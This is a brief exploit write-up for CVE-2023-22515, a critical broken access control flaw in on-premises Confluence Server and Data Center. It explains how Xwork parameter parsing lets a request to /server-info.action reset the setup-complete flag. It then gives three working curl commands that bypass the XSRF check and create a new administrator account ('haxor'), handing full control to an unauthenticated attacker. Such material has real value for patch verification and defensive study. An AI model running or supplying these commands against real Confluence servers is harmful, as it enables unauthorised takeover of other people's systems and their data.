# CVE-2023-22515

CVE-2023-22515, a critical vulnerability affecting on-premises instances of Confluence Server and Confluence Data Center, a Broken Access Control vulnerability. Attlassian has provided a CVSS base score of 10.0

# Exploit

## Brief explanation:

1- Due to how Xwork interceptors parses parameters  `/test.action?one=a` equals to `setOne()='a'` alternatively `/test.action?one.two=a` equals to `getOne().setTwo()="a"`

2- `/setup/*` endpoints include a `@ParameterSafe` call which allows us to use the `set` and `get` like in `/setup/setupdb.action?dbConfigInfo.databaseType=postgresql`, however since /setup/* endpoints are blocked because the setup is complete, `/server-info.action` can be used

3- Find the set method for complete setup => `getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false);`

4- Use the "X-Atlassian-Token" header to bypass XSRF

```bash
curl http://localhost/server-info.action\?bootstrapStatusProvider.applicationConfig.setupComplete\=false\; 

curl -X POST -H "X-Atlassian-Token: no-check" -d "username=haxor&fullName=leet&email=leet@leet.com&password=leet&confirm=leet&setup-next-button=Next" http://localhost/setup/setupadministrator.action\; 

curl -X POST -H "X-Atlassian-Token: no-check" http://localhost/setup/finishsetup.action

```

# Refrences

**DISCLAIMER:** Exploit wasn't discovered or made by me credit go to the articles below

https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis

https://blog.s1r1us.ninja/research/brokenconflu
